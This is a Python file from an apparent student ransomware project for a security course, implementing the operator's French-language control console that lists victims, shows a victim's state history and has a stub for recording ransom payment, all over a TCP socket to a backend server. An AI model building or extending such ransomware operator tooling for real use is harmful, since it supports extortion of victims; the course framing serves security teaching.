# --------------------------------------------

# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : main

# --------------------------------------------
import socket
from socket import SHUT_RDWR
import utile.configgetter as config
def main():
    """ Console de contrôle """
    # Key server start
    print('CONSOLE DE CONTRÔLE'
          '\n==================='
          '\n1) Liste des victimes du ransomware'
          '\n2) Historique des états d''une victime'
          '\n3) Renseigner le paiement de rançon d''une victime'
          '\n4) Quitter')
    # Création de la socket de connexion
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # On se connecte
    s.connect((config.get_ip("config.json"), config.get_port("config.json")))
    # 19 ainsi il est initalisé à une variable impossible à atteindre
    choix = "19"
    while choix != '4':
        # On demande un choix plus cohérent basé sur le menu plus haut
        choix = input('Votre choix : ')
        if choix == '1':
            # On demande au serveur frontale de lister les victimes
            # Lui va interroger la DB Sqlite
            s.send(bytes("1", 'utf-8'))
            # On récupère la réponse en écoutant
            data = s.recv(2048).decode()
            # Et on l'envoie...
            print('Réception de données de la part du serveur : ' + str(data))
        elif choix == '2':
            # On demande au serveur frontale l'historique d'une victime
            s.send(bytes("2", 'utf-8'))
            # On écoute la réponse...
            data = s.recv(2048).decode()
            # Le serveur nous réponds, il demande un ID victime.
            print('Réception de données de la part du serveur : ' + str(data))
            # On construit un input pour demander à l'utilisateur l'ID
            id = input('Merci de préciser un ID pour consulter l''historique : ')
            # On transmet l'ID au serveur frontale
            s.send(bytes(str(id), 'utf-8'))
            # On écoute la réponse
            data_h = s.recv(2048).decode()
            # On reçoit l'historique...
            print('Réception de données de la part du serveur : ' + str(data_h))
        elif choix == '3':
            # Todo Fill payload
            # C'est à faire
            print(fill_payload())
        elif choix == '4':
            # On ferme la connexion et quitte la console de contrôle
            # On prévient le serveur qu'on ferme la connexion avant de la fermer
            # Afin de garder des traces (logs)
            s.send(bytes("4", 'utf-8'))
            data = s.recv(2048).decode()
            print('Réception de données de la part du serveur : ' + str(data))
            # On break et la connexion se ferme en sortant du break
            break
    s.close()

def fill_payload():
    return 'Todo payload'

if __name__ == '__main__':
    main()
